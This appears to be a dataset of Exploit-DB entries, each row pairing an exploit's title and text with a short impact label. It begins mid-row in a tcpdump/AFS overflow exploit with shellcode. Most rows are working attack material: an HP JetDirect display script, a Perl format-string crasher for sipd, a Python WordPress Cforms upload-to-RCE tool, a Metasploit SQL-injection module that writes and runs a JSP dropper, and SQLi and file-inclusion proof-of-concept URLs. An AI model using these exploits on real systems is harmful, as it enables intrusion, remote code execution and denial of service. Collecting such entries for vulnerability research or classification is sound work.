*(lptr++)=htonl(AFS_CALL);   *(lptr++)=htonl(1);   *(lptr++)=htonl(2);   *(lptr++)=htonl(3);    *(lptr++)=htonl(420);   chptr=(char *)lptr;   sprintf(chptr,""1 0\n"");   chptr+=4;    memset(chptr,'A',120);   chptr+=120;   lptr=(long int *)chptr;   for (aux=0;aux<NUM_ADDR;aux++) *(lptr++)=return_addr;   chptr=(char *)lptr;   memset(chptr,NOP,NUM_NOP);   chptr+=NUM_NOP;   shellcode[30]=(char)(46+strlen(argv[2]));   memcpy(chptr,shellcode,strlen(shellcode));   chptr+=strlen(shellcode);   memcpy(chptr,argv[2],strlen(argv[2]));   chptr+=strlen(argv[2]);    sprintf(chptr,"" 1\n"");    if (sendto(sock,buffer,520,0,&addr,sizeof(addr))==-1) {      perror(""send()"");      exit(-1);      }    fprintf(stderr,""Packet with Overflow sent, now wait for the xterm!!!! :)\n\n"");    close(sock);   return(0);  }  //------- tcpdump-xploit.c ----------",overwrite stack variables,1
36729,"Basic Analysis and Security Engine (BASE) 1.4.5 - 'base_stat_common.php?base_path' Remote File Inclusion source: https://www.securityfocus.com/bid/51979/info                             BASE is prone to a security-bypass vulnerability and multiple remote file-include vulnerabilities.                             An attacker can exploit these issues to gain unauthorized access, obtain potentially sensitive information, or execute arbitrary script code in the context of the webserver process. This may allow the attacker to compromise the application and the computer; other attacks are also possible.                             BASE 1.4.5 is vulnerable; other versions may be affected.  Exploit: http://www.example.com/base/base_stat_common.php?BASE_path=[EV!L]","gain unauthorized access, obtain potentially sensitive information, or execute arbitrary script code in the context of the webserver process",1
20565,"HP JetDirect rev. G.08.x/rev. H.08.x/x.08.x/J3111A - LCD Display Modification /* source: https://www.securityfocus.com/bid/2245/info  Certain versions of HP JetDirect enabled printers provide a function (PJL command) that changes the LCD display on a printer over TCP/IP. Arbitrary strings can be sent to the LCD display by a remote user using this command. This represents more of a nuisance than a threat, although it is conceivable that the ability to modify the display could be used in some sort of ""social engineering"" scheme.  */  /*    HP Printer Hack    12/8/97 sili@l0pht.com */  #include <sys/types.h> #include <sys/socket.h> #include <netdb.h> #include <netinet/in.h> #include <stdio.h>  #define PORT 9100  int main (int argc, char *argv[]) {    int sockfd,len,bytes_sent;   /* Sock FD */   struct hostent *host;   /* info from gethostbyname */   struct sockaddr_in dest_addr;   /* Host Address */   char line[100];    if (argc !=3) {     printf(""HP Display Hack\n--sili@l0pht.com 12/8/97\n\n%s printer \""message\""\n"",argv[0]);     printf(""\tMessage can be up to 16 characters long\n"");     exit(1);   }    if ( (host=gethostbyname(argv[1])) == NULL) {     perror(""gethostbyname"");     exit(1);   }    printf (""HP Display hack -- sili@l0pht.com\n"");   printf (""Hostname:   %s\n"", argv[1]);   printf (""Message: %s\n"",argv[2]);    /* Prepare dest_addr */   dest_addr.sin_family= host->h_addrtype;  /* AF_INET from gethostbyname */   dest_addr.sin_port= htons(PORT) ; /* PORT defined above */    /* Prepare dest_addr */   bcopy(host->h_addr, (char *) &dest_addr.sin_addr, host->h_length);    bzero(&(dest_addr.sin_zero), 8);  /* Take care of  sin_zero  ??? */     /* Get socket */ /*  printf (""Grabbing socket....\n""); */   if ((sockfd=socket(AF_INET,SOCK_STREAM,0)) < 0) {     perror(""socket"");     exit(1);   }    /* Connect !*/    printf (""Connecting....\n"");    if (connect(sockfd, (struct sockaddr *)&dest_addr,sizeof(dest_addr)) == -1){     perror(""connect"");     exit(1);}    /* Preparing JPL Command */    strcpy(line,""\033%-12345X@PJL RDYMSG DISPLAY = \"""");   strncat(line,argv[2],16);   strcat(line,""\""\r\n\033%-12345X\r\n"");    /* Sending data! */  /*  printf (""Sending Data...%d\n"",strlen(line));*/ /*  printf (""Line: %s\n"",line); */   bytes_sent=send(sockfd,line,strlen(line),0);    printf(""Sent %d bytes\n"",bytes_sent);   close(sockfd); }",Arbitrary strings,1
47278,"Adobe Acrobat Reader DC for Windows - free() of Uninitialized Pointer due to Malformed JBIG2Globals Stream We have observed the following access violation exception in the latest version of Adobe Acrobat Reader DC for Windows, when opening a malformed PDF file:  --- cut --- (4970.179c): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=c0c0c0a0 ebx=00000000 ecx=c0c0c000 edx=c0c0c0a0 esi=66d6aa60 edi=00000000 eip=66d68718 esp=005bb01c ebp=005bb068 iopl=0         nv up ei ng nz na pe nc cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210286 verifier!AVrfpDphFindBusyMemoryNoCheck+0xb8: 66d68718 813abbbbcdab    cmp     dword ptr [edx],0ABCDBBBBh ds:002b:c0c0c0a0=????????  0:000> kb  # ChildEBP RetAddr  Args to Child               00 005bb068 66d68835 009f1000 c0c0c0c0 00000000 verifier!AVrfpDphFindBusyMemoryNoCheck+0xb8 01 005bb08c 66d68ab0 009f1000 c0c0c0c0 005bb124 verifier!AVrfpDphFindBusyMemory+0x15 02 005bb0a8 66d6aaf0 009f1000 c0c0c0c0 00001000 verifier!AVrfpDphFindBusyMemoryAndRemoveFromBusyList+0x20 03 005bb0c4 77305359 009f0000 01000002 c0c0c0c0 verifier!AVrfDebugPageHeapFree+0x90 04 005bb134 7725ad86 c0c0c0c0 131a284b 00000000 ntdll!RtlDebugFreeHeap+0x3c 05 005bb290 7725ac3d 00000000 c0c0c0c0 005bb630 ntdll!RtlpFreeHeap+0xd6 06 005bb2e0 66e5aad0 009f0000 00000000 c0c0c0c0 ntdll!RtlFreeHeap+0x7cd 07 005bb2fc 74a2db1b 009f0000 00000000 c0c0c0c0 vrfcore!VfCoreRtlFreeHeap+0x20 08 005bb310 74a2dae8 c0c0c0c0 00000000 005bb330 ucrtbase!_free_base+0x1b 09 005bb320 12192849 c0c0c0c0 723baff0 005bc4cc ucrtbase!free+0x18 WARNING: Stack unwind information not available. Following frames may be wrong. 0a 005bb330 1282c991 c0c0c0c0 723baff0 12840782 AcroRd32!AcroWinMainSandbox+0x6a49 0b 005bc4cc 1283fa3b 726faf88 00000001 6d4befe8 AcroRd32!AX_PDXlateToHostEx+0x33e941 0c 005bc504 1283209f 5f3b4f54 5f3b4f54 7c2fcfb8 AcroRd32!CTJPEGTiledContentWriter::operator=+0x21ab 0d 005bc518 12825007 7c2fcfb8 00000044 52842f80 AcroRd32!AX_PDXlateToHostEx+0x34404f 0e 005bc5cc 122257c9 5f3b4f54 6e87cfb0 12225730 AcroRd32!AX_PDXlateToHostEx+0x336fb7 0f 005bc5f0 122256c3 57050fd8 00000001 00000028 AcroRd32!DllCanUnloadNow+0x4c809 10 005bc610 1267215a 005bc634 57050fd8 00000028 AcroRd32!DllCanUnloadNow+0x4c703 11 005bc654 1235a3a8 c0010000 0000000c 57050fd8 AcroRd32!AX_PDXlateToHostEx+0x18410a 12 005bc9a8 123598e6 005bca04 7333ca98 c9eeee9e AcroRd32!DllCanUnloadNow+0x1813e8 13 005bc9e0 123597c1 005bca04 7333ca98 005bca70 AcroRd32!DllCanUnloadNow+0x180926 14 005bca4c 12358788 c0010000 0000000c 7333ca98 AcroRd32!DllCanUnloadNow+0x180801 15 005bceac 12355cd7 005bd1b0 5eb4e5ac c0010000 AcroRd32!DllCanUnloadNow+0x17f7c8 16 005be68c 12355955 5eb4e5ac c0010000 0000000c AcroRd32!DllCanUnloadNow+0x17cd17 17 005be75c 123393ed c9eecf42 78356f78 00000000 AcroRd32!DllCanUnloadNow+0x17c995 18 005be83c 123381e8 00000001 00000000 00000000 AcroRd32!DllCanUnloadNow+0x16042d 19 005be888 1232b383 78356f78 00000000 00000000 AcroRd32!DllCanUnloadNow+0x15f228 1a 005be9fc 1232ac97 17822dbc 00000001 7f976ef8 AcroRd32!DllCanUnloadNow+0x1523c3 1b 005bea64 12328590 c9eecd9a 735a5e74 7f976ef8 AcroRd32!DllCanUnloadNow+0x151cd7 1c 005beae4 1232825a 7f976ef8 7302cf40 735a5e44 AcroRd32!DllCanUnloadNow+0x14f5d0 1d 005beb20 123a6099 7f976ef8 7302cf40 735a5e44 AcroRd32!DllCanUnloadNow+0x14f29a 1e 005bebf8 123a57f9 6a53efc8 00000000 7302cf40 AcroRd32!CTJPEGDecoderRelease+0x2b209 1f 005bec38 123a5717 6a53efc8 00000000 7302cf40 AcroRd32!CTJPEGDecoderRelease+0x2a969 20 005bec70 123a5669 00000000 7302cf40 005bedf0 AcroRd32!CTJPEGDecoderRelease+0x2a887 21 005bec8c 123a51ec 7302cf40 005bedf0 005bee08 AcroRd32!CTJPEGDecoderRelease+0x2a7d9 22 005bee54 123a4a8c 00000002 00000000 ffffffff AcroRd32!CTJPEGDecoderRelease+0x2a35c 23 005bf074 123a47d4 123a47a0 5f558f90 005bf0cc AcroRd32!CTJPEGDecoderRelease+0x29bfc 24 005bf084 121fed79 6abbb1b8 c9eed7b2 5dd08ff8 AcroRd32!CTJPEGDecoderRelease+0x29944 25 005bf0cc 121fe83d 000004df c9eed642 15c34fd8 AcroRd32!DllCanUnloadNow+0x25db9 26 005bf13c 121fe5d4 c9eed61a 15c34fd8 121fe560 AcroRd32!DllCanUnloadNow+0x2587d 27 005bf164 12194709 000004d3 00000000 12194270 AcroRd32!DllCanUnloadNow+0x25614 28 005bf180 7460e0bb 01340c64 00000113 000004d3 AcroRd32!AcroWinMainSandbox+0x8909 29 005bf1ac 74618849 12194270 01340c64 00000113 USER32!_InternalCallWinProc+0x2b 2a 005bf1d0 7461b145 00000113 000004d3 00000000 USER32!InternalCallWinProc+0x20 2b 005bf2a0 746090dc 12194270 00000000 00000113 USER32!UserCallWinProcCheckWow+0x1be 2c 005bf30c 74608c20 7b28fd14 005bf330 121fda8b USER32!DispatchMessageWorker+0x4ac 2d 005bf318 121fda8b 005bf34c 15b4fdd8 15b4fdd8 USER32!DispatchMessageW+0x10 2e 005bf330 121fd81e 005bf34c c9eed4da 15b4fdd8 AcroRd32!DllCanUnloadNow+0x24acb 2f 005bf3a4 121fd6b4 c9eed4a2 15b4fdd8 00000000 AcroRd32!DllCanUnloadNow+0x2485e 30 005bf3dc 1218c556 c9eed332 1489eff8 00000000 AcroRd32!DllCanUnloadNow+0x246f4 31 005bf44c 1218bf81 12160000 00af0000 1489eff8 AcroRd32!AcroWinMainSandbox+0x756 32 005bf86c 00af783d 12160000 00af0000 1489eff8 AcroRd32!AcroWinMainSandbox+0x181 33 005bfc38 00bffd2a 00af0000 00000000 00a0b3ba AcroRd32_exe+0x783d 34 005bfc84 73cf8674 007e2000 73cf8650 386b17d8 AcroRd32_exe!AcroRd32IsBrokerProcess+0x9940a 35 005bfc98 77285e17 007e2000 131a663b 00000000 KERNEL32!BaseThreadInitThunk+0x24 36 005bfce0 77285de7 ffffffff 772aada6 00000000 ntdll!__RtlUserThreadStart+0x2f 37 005bfcf0 00000000 00af1390 007e2000 00000000 ntdll!_RtlUserThreadStart+0x1b --- cut ---  Notes:  - Reproduces on Adobe Acrobat Reader DC (2019.012.20035) on Windows 10, with and without PageHeap enabled, but most consistently with PageHeap (thanks to the allocation marker bytes).  - The crash occurs immediately after opening the PDF document, and is caused by passing an uninitialized value from the heap as an argument to the free() function. With PageHeap enabled, all new allocations are filled with the 0xc0c0c0... marker, which is visible in the crash log above.  - Attached samples: poc1.pdf and poc2.pdf (crashing files), original.pdf (original file).  - We have minimized the difference between the original and mutated files down to a single byte at offset 0x3bc, which appears to reside inside a JBIG2Globals object. It was modified from 0x00 to 0xB5 (in poc1.pdf) and to 0x35 (in poc2.pdf).   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47278.zip",access violation,1
27605,Alibaba Clone Tritanium Version - 'news_desc.html' SQL Injection #-------------------------------------------------------- #Alibaba Clone Tritanium Version  (news_desc.html)  Sql Injection Vulnerability #-------------------------------------------------------- #Date 15-08-2013 # #-------------------------------------------------------- #Discovered By: IRAQ_JAGUAR # # #Mail: iraq_jaguar@yahoo.com       #------------------------------------------------------- # #Script:   Alibaba Clone Tritanium Version # #Script Home Page:  http://www.ec21clone.com/products.php # #-------------------------------------------------------- #Poc/Exploit: # # #http://www.target.com/[path]/news_desc.html?id=6' # # #Greetz To : v4-team.com,code execution,1
27419,"Vegas Forum 1.0 - 'Forumlib.php' SQL Injection source: https://www.securityfocus.com/bid/17079/info  Vegas Forum is prone to an SQL-injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.   A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.  http://www.example.com/forum.php?postid=999% 20or%201","compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation",1
28400,"Microsoft Internet Explorer 6 - 'TSUserEX.dll' ActiveX Control Memory Corruption source: https://www.securityfocus.com/bid/19570/info  Microsoft Internet Explorer is prone to a memory-corruption vulnerability. This is related to the handling of the 'tsuserex.dll' COM object ActiveX control.  Attackers may exploit this issue via a malicious web page to execute arbitrary code in the context of the currently logged-in user. Exploitation attempts may lead to a denial-of-service condition as well. Attackers may also employ HTML email to carry out an attack.   =============== tsuserex.dll.htm start ================  <!-- // Microsoft Windows 2003 (tsuserex.dll) COM Object Instantiation Vulnerability // tested on Windows 2003 EE SP1 CN  // http://www.xsec.org // nop (nop#xsec.org)  // CLSID: {E2E9CAE6-1E7B-4B8E-BABD-E9BF6292AC29} // Info: ADsTSUserEx Class // ProgID: tsuserex.ADsTSUserEx.1 // InprocServer32: C:\WINDOWS\system32\tsuserex.dll  --!>  <html><body> <object classid=""CLSID:{E2E9CAE6-1E7B-4B8E-BABD-E9BF6292AC29}""> </object> </body> </html>  =============== tsuserex.dll.htm end ==================",execute arbitrary code in the context of the currently logged-in user,1
23444,"SX Design sipd 0.1.2/0.1.4 - Remote Format String source: https://www.securityfocus.com/bid/9236/info  sipd has been reported prone to a format string vulnerability that may be triggered remotely. It has been reported that sip URI arguments passed to the affected server are not sufficiently handled. An attacker may place format specifiers in the URI and they will be handled literally, potentially allowing the attacker to read from and write to arbitrary memory.  #!/usr/bin/perl  # SIPd - SIP Password Format String # Kills sipd version 0.1.4 and prior  use IO::Socket; use strict;  unless (@ARGV == 2) { die ""usage: $0 host your_ip [port]"" }  my $remote_host = shift(@ARGV); my $your_host = shift(@ARGV); my $port = shift(@ARGV); if ($port eq """") {  $port = ""5060""; }  my $buf = ""REGISTER sip::%s%s%s%s%s%s%s%s%s%s%s%s%s%s\@$remote_host SIP/2.0\r\ Via: SIP/2.0/UDP $your_host:3277\r\ From: \""STORM\"" <sip:$your_host:3277>\r\ To: <sip:$your_host:3277>\r\ Call-ID: 12312312\@$your_host\r\ CSeq: 1 OPTIONS\r\ Max-Forwards: 70\r\ \r\n"";  my $socket = IO::Socket::INET->new(Proto => ""udp"") or die ""Socket error: $@\n""; my $ipaddr = inet_aton($remote_host) || $remote_host; my $portaddr = sockaddr_in($port, $ipaddr);  send($socket, $buf, 0, $portaddr) == length($buf) or die ""Can't send: $!\n"";  print ""Now, '$remote_host' must be dead :)\n"";",allowing the attacker to read from and write to arbitrary memory,1
35879,"WordPress Plugin Cforms 14.7 - Remote Code Execution # Exploit Title: Remote Code Execution via Unauthorised File upload in Cforms 14.7  # Date: 2015-01-19 # Exploit Author: Zakhar # Vendor Homepage: https://wordpress.org/plugins/cforms2/ # Software Link: https://downloads.wordpress.org/plugin/cforms2.zip # Version: 14.7 # Tested on: Wordpress 4.0 # CVE : 2014-9473  import os import requests import re import base64 import sys from lxml import etree from optparse import OptionParser  def main(): 	print 'Cforms II File Upload + Remote Code Execution\n' 	 	text = 'Test text' 	text_mail = 'test@mail.com'  	parser = OptionParser() 	parser.add_option(""-f"", ""--file"", dest=""file"", help=""file to upload"", default = ""itest.php"", metavar=""FILE"") 	parser.add_option(""-i"", ""--max-iterations"", dest=""iterations"", help=""Numbe of fields to iterate"", default = ""10"") 	parser.add_option(""-b"", ""--upload-file-name-bruteforce"", dest=""brute"", help=""Uploaded file name brute force"", default = ""10"") 	parser.add_option(""-n"", ""--cforms-form-number"", dest=""number"", help=""Cforms form number"", default = """") 	parser.add_option(""-c"", ""--cforms-home-dir"", dest=""home"", help=""Cforms form home dir"", default = ""/wp-content/plugins/cforms2/"") 	parser.add_option(""-u"", ""--url"", dest=""url"", help=""vulnerable url with contact form, example: http://127.0.0.1/Contact/"")  	(opt, args) = parser.parse_args() 	options = opt.__dict__ 	if not opt.url:   # if url is not given 		parser.error('URL not given') 	if not opt.file: 		parser.error('file not given') 	filename = options[""file""] 	if os.path.isfile(filename) is not True: 		print 'No such file '+filename  		return 0  	url = options['url'] 	home = options[""home""] 	i = options[""iterations""] 	n = options[""number""] 	b = options[""brute""] 	 	s = requests.Session() 	 	r = s.get(url) 	if r.status_code != requests.codes.ok: 		print 'Error: website not found.' 		return 0 	 	tree = etree.HTML(r.text) 	# get cforms id 	if n is """": 		for x in xrange(2,10): 			for node in tree.xpath('//*[@id=""cforms'+str(x)+'form""]'): 				if node is not None: 					n = str(x) 					break 	print 'Cforms form number is <'+n+'>' 	hidden = ['cf_working'+n,'cf_failure'+n,'cf_codeerr'+n,'cf_customerr'+n,'cf_popup'+n] 	fields = ['cf'+n+'_field_'+str(x) for x in xrange(1,int(i)+1)] 	required = {'sendbutton'+n:'1'} 	 	for f in fields: 		for node in tree.xpath('//*[@id=""' + f + '""]'): 			if node is not None: 				if 'fldrequired' in node.get('class'): 					if 'fldemail' in node.get('class'): 						required[f] = text_mail 					else: 						required[f] = text 	 	for h in hidden: 		for node in tree.xpath('//*[@id=""' + h + '""]'): 			if node is not None: 				required[h] = node.get('value') 	 	for node in tree.xpath('//*[@id=""cforms_captcha'+n+'""]'): 		if node is not None: 			print 'Error: Cforms uses captcha. Sorry, you have to exploit it manually.' 			return 0 	 	files = {'cf_uploadfile'+n+'[]':('wow.php',open(filename))} 	r = s.post(url,data=required,files=files) 	 	if r.status_code != requests.codes.ok: 		print 'Error: post error.' 		print r.status_code 		return 0 	else: 		url1 = url + home + 'noid-wow.php' 		flag = 0 		if s.get(url1).status_code != requests.codes.ok: 			for l in xrange(1,int(b)): 				url1 =  url + home + str(l) + '-wow.php' 				print url1 				if s.get(url1).status_code == requests.codes.ok: 					flag = 1 					break 		else: 			flag = 1 		if flag == 1: 			print ""Succes! Uploaded file: "" + url1 		else: 			print ""Uploaded file not found. Try to increase -b flag or change upload dir. 14.6.3 version and above use wordpress upload folder""  main()",Code Execution,1
22304,"ManageEngine Security Manager Plus 5.5 build 5505 - SQL Injection (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. #   http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = ExcellentRanking  	include Msf::Exploit::Remote::HttpClient 	include Msf::Exploit::EXE  	def initialize(info={}) 		super(update_info(info, 			'Name'           => ""ManageEngine Security Manager Plus 5.5 build 5505 SQL Injection"", 			'Description'    => %q{ 					This module exploits a SQL injection found in ManageEngine Security Manager Plus 				advanced search page, which results in remote code execution under the context of 				SYSTEM in Windows; or as the user in Linux.  Authentication is not required in order 				to exploit this vulnerability. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => 				[ 					'xistence <xistence[at]0x90.nl>',  # Discovery & Metasploit module 					'sinn3r',                          # Improved Metasploit module 					'egypt'                            # Improved Metasploit module 				], 			'References'     => 				[ 					['EDB','22094'], 					['BID', '56138'] 				], 			'Platform'       => ['win', 'linux'], 			'Targets'        => 				[ 					['Automatic', {}], 					['Windows',   { 'Arch' => ARCH_X86, 'Platform' => 'win'   }], 					['Linux',     { 'Arch' => ARCH_X86, 'Platform' => 'linux' }] 				], 			'DefaultTarget'  => 0, 			'Privileged'     => false, 			'DisclosureDate' => ""Oct 18 2012""))  		register_options( 			[ 				OptPort.new('RPORT', [true, 'The target port', 6262]) 			], self.class) 	end   	def check 		res = sqli_exec(Rex::Text.rand_text_alpha(1))  		if res and res.body =~ /Error during search/ 			return Exploit::CheckCode::Appears 		else 			return Exploit::CheckCode::Safe 		end 	end   	def pick_target 		return target if target.name != 'Automatic'  		rnd_num   = Rex::Text.rand_text_numeric(1) 		rnd_fname = Rex::Text.rand_text_alpha(5) + "".txt"" 		outpath   = ""../../webapps/SecurityManager/#{rnd_fname}""  		@clean_ups << outpath  		sqli  = ""#{rnd_num})) union select @@version,"" 		sqli << (2..28).map {|e| e} * "","" 		sqli << "" into outfile \""#{outpath}\"" FROM mysql.user WHERE #{rnd_num}=((#{rnd_num}"" 		sqli_exec(sqli)  		res = send_request_raw({'uri'=>""/#{rnd_fname}""})  		# What @@version returns: 		# Linux   = 5.0.36-enterprise 		# Windows = 5.0.36-enterprise-nt  		if res and res.body =~ /\d\.\d\.\d\d\-enterprise\-nt/ 			print_status(""#{rhost}:#{rport} - Target selected: #{targets[1].name}"") 			return targets[1]  # Windows target 		elsif res and res.body =~ /\d\.\d\.\d\d\-enterprise/ 			print_status(""#{rhost}:#{rport} - Target selected: #{targets[2].name}"") 			return targets[2] 		end  		return nil 	end   	# 	# We're in SecurityManager/bin at this point 	# 	def on_new_session(cli) 		if target['Platform'] == 'linux' 			print_warning(""Malicious executable is removed during payload execution"") 		end  		if cli.type == 'meterpreter' 			cli.core.use(""stdapi"") if not cli.ext.aliases.include?(""stdapi"") 		end  		@clean_ups.each { |f| 			base = File.basename(f) 			f = ""../webapps/SecurityManager/#{base}"" 			print_warning(""#{rhost}:#{rport} - Deleting: \""#{base}\"""")  			begin 				if cli.type == 'meterpreter' 					cli.fs.file.rm(f) 				else 					del_cmd = (@my_target['Platform'] == 'linux') ? 'rm' : 'del' 					f = f.gsub(/\//, '\\') if @my_target['Platform'] == 'win' 					cli.shell_command_token(""#{del_cmd} \""#{f}\"""") 				end  				print_good(""#{rhost}:#{rport} - \""#{base}\"" deleted"") 			rescue ::Exception => e 				print_error(""Unable to delete: #{e.message}"") 			end 		} 	end   	# 	# Embeds our executable in JSP 	# 	def generate_jsp_payload 		opts                = {:arch => @my_target.arch, :platform => @my_target.platform} 		native_payload      = Rex::Text.encode_base64(generate_payload_exe(opts)) 		native_payload_name = Rex::Text.rand_text_alpha(rand(6)+3) 		ext                 = (@my_target['Platform'] == 'win') ? '.exe' : '.bin'  		var_raw     = Rex::Text.rand_text_alpha(rand(8) + 3) 		var_ostream = Rex::Text.rand_text_alpha(rand(8) + 3) 		var_buf     = Rex::Text.rand_text_alpha(rand(8) + 3) 		var_decoder = Rex::Text.rand_text_alpha(rand(8) + 3) 		var_tmp     = Rex::Text.rand_text_alpha(rand(8) + 3) 		var_path    = Rex::Text.rand_text_alpha(rand(8) + 3) 		var_proc2   = Rex::Text.rand_text_alpha(rand(8) + 3)  		if @my_target['Platform'] == 'linux' 			var_proc1 = Rex::Text.rand_text_alpha(rand(8) + 3) 			chmod = %Q| 			Process #{var_proc1} = Runtime.getRuntime().exec(""chmod 777 "" + #{var_path}); 			Thread.sleep(200); 			|  			var_proc3 = Rex::Text.rand_text_alpha(rand(8) + 3) 			cleanup = %Q| 			Thread.sleep(200); 			Process #{var_proc3} = Runtime.getRuntime().exec(""rm "" + #{var_path}); 			| 		else 			chmod   = '' 			cleanup = '' 		end  		jsp = %Q| 		<%@page import=""java.io.*""%> 		<%@page import=""sun.misc.BASE64Decoder""%>  		<% 		byte[] #{var_raw} = null; 		BufferedOutputStream #{var_ostream} = null; 		try { 			String #{var_buf} = ""#{native_payload}"";  			BASE64Decoder #{var_decoder} = new BASE64Decoder(); 			#{var_raw} = #{var_decoder}.decodeBuffer(#{var_buf}.toString());  			File #{var_tmp} = File.createTempFile(""#{native_payload_name}"", ""#{ext}""); 			String #{var_path} = #{var_tmp}.getAbsolutePath();  			#{var_ostream} = new BufferedOutputStream(new FileOutputStream(#{var_path})); 			#{var_ostream}.write(#{var_raw}); 			#{var_ostream}.close(); 			#{chmod} 			Process #{var_proc2} = Runtime.getRuntime().exec(#{var_path}); 			#{cleanup} 		} catch (Exception e) { 		} 		%> 		|  		jsp = jsp.gsub(/\n/, '') 		jsp = jsp.gsub(/\t/, '')  		jsp.unpack(""H*"")[0] 	end  	def sqli_exec(sqli_string) 		cookie  = 'STATE_COOKIE=&' 		cookie << 'SecurityManager/ID/174/HomePageSubDAC_LIST/223/SecurityManager_CONTENTAREA_LIST/226/MainDAC_LIST/166&' 		cookie << 'MainTabs/ID/167/_PV/174/selectedView/Home&' 		cookie << 'Home/ID/166/PDCA/MainDAC/_PV/174&' 		cookie << 'HomePageSub/ID/226/PDCA/SecurityManager_CONTENTAREA/_PV/166&' 		cookie << 'HomePageSubTab/ID/225/_PV/226/selectedView/HomePageSecurity&' 		cookie << 'HomePageSecurity/ID/223/PDCA/HomePageSubDAC/_PV/226&' 		cookie << '_REQS/_RVID/SecurityManager/_TIME/31337; ' 		cookie << '2RequestsshowThreadedReq=showThreadedReqshow; ' 		cookie << '2RequestshideThreadedReq=hideThreadedReqhide;'  		state_id = Rex::Text.rand_text_numeric(5)  		send_request_cgi({ 			'method'    => 'POST', 			'uri'       => ""/STATE_ID/#{state_id}/jsp/xmlhttp/persistence.jsp"", 			'headers'   => { 				'Cookie' => cookie, 				'Accept-Encoding' => 'identity' 			}, 			'vars_get'  => { 				'reqType'    =>'AdvanceSearch', 				'SUBREQUEST' =>'XMLHTTP' 			}, 			'vars_post' => { 				'ANDOR'       => 'and', 				'condition_1' => 'OpenPorts@PORT', 				'operator_1'  => 'IN', 				'value_1'     => sqli_string, 				'COUNT'       => '1' 			} 		}) 	end  	# 	# Run the actual exploit 	# 	def inject_exec(out) 		hex_jsp = generate_jsp_payload 		rnd_num = Rex::Text.rand_text_numeric(1) 		sqli  = ""#{rnd_num})) union select 0x#{hex_jsp},"" 		sqli << (2..28).map {|e| e} * "","" 		sqli << "" into outfile \""#{out}\"" FROM mysql.user WHERE #{rnd_num}=((#{rnd_num}""  		print_status(""#{rhost}:#{rport} - Trying SQL injection..."") 		sqli_exec(sqli)  		fname = ""/#{File.basename(out)}"" 		print_status(""#{rhost}:#{rport} - Requesting #{fname}"") 		send_request_raw({'uri' => fname})  		handler 	end   	def exploit 		# This is used to collect files we want to delete later 		@clean_ups = []  		@my_target = pick_target 		if @my_target.nil? 			print_error(""#{rhost}:#{rport} - Unable to select a target, we must bail."") 			return 		end  		jsp_name  = rand_text_alpha(rand(6)+3) 		outpath   = ""../../webapps/SecurityManager/#{jsp_name + '.jsp'}""  		@clean_ups << outpath  		inject_exec(outpath) 	end end",code execution,1
31122,"Ipswitch Instant Messaging 2.0.8.1 - Multiple Vulnerabilities source: https://www.securityfocus.com/bid/27677/info  Ipswitch Instant Messaging is prone to multiple security vulnerabilities, including a denial-of-service vulnerability, a format-string vulnerability, and a vulnerability that allows attackers to overwrite arbitrary files.  Attackers can exploit these issues to execute arbitrary code, cause denial-of-service conditions, or overwrite files with arbitrary content.  These issues affect Ipswitch Instant Messaging 2.0.8.1; other versions may also be affected.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/31122.zip",overwrite arbitrary files,1
18480,"Dolibarr ERP/CRM 3.2.0 < Alpha - File Inclusion Title: ====== Dolibarr CMS v3.2.0 Alpha - File Include Vulnerabilities   Date: ===== 2012-02-07   References: =========== http://www.vulnerability-lab.com/get_content.php?id=428   VL-ID: ===== 428   Introduction: ============= Dolibarr ERP & CRM is a modern software to manage your company or foundation activity (contacts, suppliers,  invoices, orders, stocks, agenda, ...). It s an opensource free software designed for small and medium  companies, foundations and freelances. You can install, use and distribute it as a standalone application  or as a web application (on mutualized or dedicated server, or on SaaS or Cloud solutions) and use it with  any devices (desktop, smartphone, tablet).  (Copy of the Vendor Homepage: http://www.dolibarr.org/)   Abstract: ========= Vulnerability-Lab researcher discovered a multiple File Include Vulnerabilities on Dolibarrs CMS v3.2.0 Alpha.   Report-Timeline: ================ 2011-02-08:	Public or Non-Public Disclosure   Status: ======== Published   Exploitation-Technique: ======================= Remote   Severity: ========= Critical   Details: ======== Multiple File Include Vulnerabilities are detected on Dolibarrs Content Management System v3.2.0 Alpha. The vulnerability allows an attacker (remote) or local low privileged user account to request local web-server  or system files.  Successful exploitation of the vulnerability results in dbms & application compromise.  Vulnerable Module(s): 					[+] ?modulepart=project&file= 					[+] ?action=create&actioncode=AC_RDV&contactid=1&socid=1&backtopage=   Picture(s): 					../1.png 					../2.png   Proof of Concept: ================= The vulnerabilities can be exploited by remote attackers or local low privileged user accounts. For demonstration or reproduce ...   http://server/document.php?modulepart=project&file=../[FILE INCLUDE VULNERABILITY!]  http://server/comm/action/fiche.php?action=create&actioncode=AC_RDV&contactid=1&socid=1&backtopage=../common/[FILE INCLUDE VULNERABILITY!]   Risk: ===== The security riks of the file include vulnerabilities are estimated as high(+).   Credits: ======== Vulnerability Research Laboratory - Benjamin Kunz Mejri & Ucha Gobejishvili (longrifle0x)    Disclaimer: =========== The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties,  either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability- Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business  profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some  states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation  may not apply. Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability- Lab. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of  other media, are reserved by Vulnerability-Lab or its suppliers.      						Copyright � 2011|Vulnerability-Lab     --  Website: www.vulnerability-lab.com ; vuln-lab.com or vuln-db.com Contact: admin@vulnerability-lab.com or support@vulnerability-lab.com",information disclosure,1
